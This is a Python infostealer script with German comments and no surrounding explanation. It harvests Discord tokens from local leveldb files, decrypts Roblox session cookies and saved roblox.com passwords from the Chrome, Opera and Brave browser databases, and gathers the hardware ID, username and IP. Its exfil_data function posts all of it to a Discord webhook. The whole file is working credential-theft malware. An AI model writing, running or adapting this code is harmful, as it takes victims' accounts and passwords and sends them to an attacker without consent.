import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import requests
import subprocess
import sys
import re
from pathlib import Path
import time
import random

# Fallback - Webhook direkt im Code (ersetze HIER deine URL)
WEBHOOK_URL = os.getenv('WEBHOOK_URL') or "https://discord.com/api/webhooks/DEIN_WEBHOOK_HIER"

# Paths
DISCORD_PATH = os.path.join(os.getenv('APPDATA'), r'Discord\Local State')
DISCORD_DB_PATH = os.path.join(os.getenv('APPDATA'), r'Discord\Local Storage\leveldb')

def exfil_data(title, fields):
    embed = {"title": title, "color": 0xff5555, "fields": fields}
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        print(f"✓ {title}")
        return True
    except Exception as e:
        print(f"✗ Exfil failed: {e}")
        return False

def get_discord_tokens():
    tokens = []
    try:
        if os.path.exists(DISCORD_PATH):
            with open(DISCORD_PATH, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                
            for file in os.listdir(DISCORD_DB_PATH):
                if file.endswith(('.log', '.ldb')):
                    db_path = os.path.join(DISCORD_DB_PATH, file)
                    try:
                        with open(db_path, 'r', errors='ignore') as f:
                            for line in f.readlines():
                                token_match = re.search(r'["\']((mfa\.)?[A-Za-z0-9_-]{59,70})["\']', line)
                                if token_match:
                                    token = token_match.group(1)
                                    try:
                                        tokens.append(win32crypt.CryptUnprotectData(token.encode(), None, None, None, 0)[1].decode())
                                    except:
                                        tokens.append(token)
                    except:
                        continue
    except:
        pass
    return list(set(tokens))

def get_roblox_creds():
    creds = {"cookies": [], "logins": []}
    
    # Cookie paths
    cookie_paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Network\Cookies'),
        os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable\Network\Cookies'),
        os.path.join(os.getenv('LOCALAPPDATA'), r'BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies')
    ]
    
    for cookie_path in cookie_paths:
        if os.path.exists(cookie_path):
            try:
                shutil.copy2(cookie_path, "temp.db")
                conn = sqlite3.connect("temp.db")
                cursor = conn.cursor()
                cursor.execute("SELECT encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
                for row in cursor.fetchall():
                    val = row[0]
                    if val.startswith(b'v10') or val.startswith(b'v11'):
                        cookie = win32crypt.CryptUnprotectData(val, None, None, None, 0)[1].decode()
                    else:
                        cookie = base64.b64decode(val).decode()
                    creds["cookies"].append(cookie)
                conn.close()
                os.remove("temp.db")
            except:
                pass
    
    # Login paths
    login_paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Login Data'),
        os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable\Login Data'),
        os.path.join(os.getenv('LOCALAPPDATA'), r'BraveSoftware\Brave-Browser\User Data\Default\Login Data')
    ]
    
    for login_path in login_paths:
        if os.path.exists(login_path):
            try:
                shutil.copy2(login_path, "temp_login.db")
                conn = sqlite3.connect("temp_login.db")
                cursor = conn.cursor()
                cursor.execute("SELECT username_value, password_value FROM logins WHERE origin_url LIKE '%roblox.com'")
                for row in cursor.fetchall():
                    username, enc_pass = row
                    if enc_pass:
                        password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode()
                        creds["logins"].append(f"{username}:{password}")
                conn.close()
                os.remove("temp_login.db")
            except:
                pass
    
    return creds

def main():
    print("Starting...")
    
    # Test webhook
    if not exfil_data("🧪 Test", [{"name": "Status", "value": "Online", "inline": True}]):
        print("ERROR: Webhook nicht erreichbar!")
        return
    
    # System info
    try:
        hw_id = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
        user = os.getenv('USERNAME')
        ip = requests.get('https://httpbin.org/ip', timeout=5).json()['origin']
        exfil_data("🖥️ System", [
            {"name": "Hardware ID", "value": hw_id, "inline": True},
            {"name": "User", "value": user, "inline": True},
            {"name": "IP", "value": ip, "inline": True}
        ])
    except:
        pass
    
    # Discord tokens
    tokens = get_discord_tokens()
    if tokens:
        fields = [{"name": f"Token {i+1}", "value": f"{t[:25]}...", "inline": False} for i, t in enumerate(tokens)]
        exfil_data("🔑 Discord Tokens", fields)
    else:
        exfil_data("🔑 Discord", [{"name": "Tokens", "value": "Keine gefunden", "inline": False}])
    
    # Roblox
    roblox = get_roblox_creds()
    fields = []
    for i, cookie in enumerate(roblox["cookies"]):
        fields.append({"name": f"Cookie {i+1}", "value": f"{cookie[:35]}...", "inline": False})
    for i, login in enumerate(roblox["logins"]):
        fields.append({"name": f"Login {i+1}", "value": f"{login}", "inline": False})
    
    if fields:
        exfil_data("🎮 Roblox", fields)
    else:
        exfil_data("🎮 Roblox", [{"name": "Credentials", "value": "Keine gefunden", "inline": False}])
    
    exfil_data("✅ FERTIG", [{"name": "Tokens", "value": str(len(tokens)), "inline": True}])
    print("✓ Alles exfiltriert!")

if __name__ == "__main__":
    time.sleep(2)
    main()